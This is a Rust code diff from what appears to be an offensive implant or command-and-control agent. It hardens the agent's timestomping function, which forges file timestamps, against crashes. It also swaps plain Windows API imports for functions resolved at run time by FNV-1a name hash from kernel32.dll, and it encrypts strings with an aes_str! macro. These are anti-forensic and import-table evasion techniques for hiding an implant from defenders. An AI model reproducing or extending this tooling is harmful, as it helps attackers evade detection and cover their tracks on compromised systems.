@@ -41,7 +41,15 @@ pub fn timestomp_copy(target: &str, reference: &str) -> Result<String, String> {
 /// Set a file's timestamps to a specific Unix epoch value.
 /// Format: timestomp:set <path> <unix_timestamp>
 pub fn timestomp_epoch(path: &str, epoch_secs: i64) -> Result<String, String> {
-    let time = std::time::UNIX_EPOCH + std::time::Duration::from_secs(epoch_secs as u64);
+    // A negative epoch wraps `as u64` to ~1.8e19 and the SystemTime add
+    // overflows (panic with panic="abort" kills the agent), so reject it
+    // before any conversion. checked_add guards the huge-positive case.
+    if epoch_secs < 0 {
+        return Err(format!("{}: {}", aes_str!("Invalid epoch"), epoch_secs));
+    }
+    let time = std::time::UNIX_EPOCH
+        .checked_add(std::time::Duration::from_secs(epoch_secs as u64))
+        .ok_or_else(|| format!("{}: {}", aes_str!("Epoch out of range"), epoch_secs))?;
 
     #[cfg(target_os = "windows")]
     {
@@ -71,8 +79,15 @@ fn set_file_times_win(
     #[derive(Copy, Clone)]
     struct FILETIME { low: u32, high: u32 }
 
-    extern "system" {
-        fn SetFileTime(h: *mut c_void, created: *const FILETIME, accessed: *const FILETIME, modified: *const FILETIME) -> i32;
+    /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+    unsafe fn SetFileTime(h: *mut c_void, created: *const FILETIME, accessed: *const FILETIME, modified: *const FILETIME) -> i32 {
+        type F = unsafe extern "system" fn(*mut c_void, *const FILETIME, *const FILETIME, *const FILETIME) -> i32;
+        static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+        let p = *P.get_or_init(||
+            crate::agent::injection::win_resolve::resolve_ptr(
+                b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"SetFileTime")));
+        let f: F = unsafe { std::mem::transmute(p) };
+        unsafe { f(h, created, accessed, modified) }
     }
 
     fn systime_to_filetime(t: std::time::SystemTime) -> FILETIME {
@@ -283,10 +298,35 @@ pub fn ads_list(file_path: &str) -> Result<Vec<String>, String> {
             stream_name: [u16; 296],
         }
 
-        extern "system" {
-            fn FindFirstStreamW(filename: *const u16, info_level: u32, data: *mut WIN32_FIND_STREAM_DATA, flags: u32) -> *mut c_void;
-            fn FindNextStreamW(handle: *mut c_void, data: *mut WIN32_FIND_STREAM_DATA) -> i32;
-            fn FindClose(handle: *mut c_void) -> i32;
+        /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn FindFirstStreamW(filename: *const u16, info_level: u32, data: *mut WIN32_FIND_STREAM_DATA, flags: u32) -> *mut c_void {
+            type F = unsafe extern "system" fn(*const u16, u32, *mut WIN32_FIND_STREAM_DATA, u32) -> *mut c_void;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(||
+                crate::agent::injection::win_resolve::resolve_ptr(
+                    b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"FindFirstStreamW")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(filename, info_level, data, flags) }
+        }
+        /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn FindNextStreamW(handle: *mut c_void, data: *mut WIN32_FIND_STREAM_DATA) -> i32 {
+            type F = unsafe extern "system" fn(*mut c_void, *mut WIN32_FIND_STREAM_DATA) -> i32;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(||
+                crate::agent::injection::win_resolve::resolve_ptr(
+                    b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"FindNextStreamW")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(handle, data) }
+        }
+        /// Lazily resolved from kernel32.dll by name hash (import-table hygiene).
+        unsafe fn FindClose(handle: *mut c_void) -> i32 {
+            type F = unsafe extern "system" fn(*mut c_void) -> i32;
+            static P: std::sync::OnceLock<usize> = std::sync::OnceLock::new();
+            let p = *P.get_or_init(||
+                crate::agent::injection::win_resolve::resolve_ptr(
+                    b"kernel32.dll\0", crate::agent::injection::win_resolve::fnv1a_32(b"FindClose")));
+            let f: F = unsafe { std::mem::transmute(p) };
+            unsafe { f(handle) }
         }
 
         let wide_path: Vec<u16> = file_path.encode_utf16().chain(std::iter::once(0)).collect();
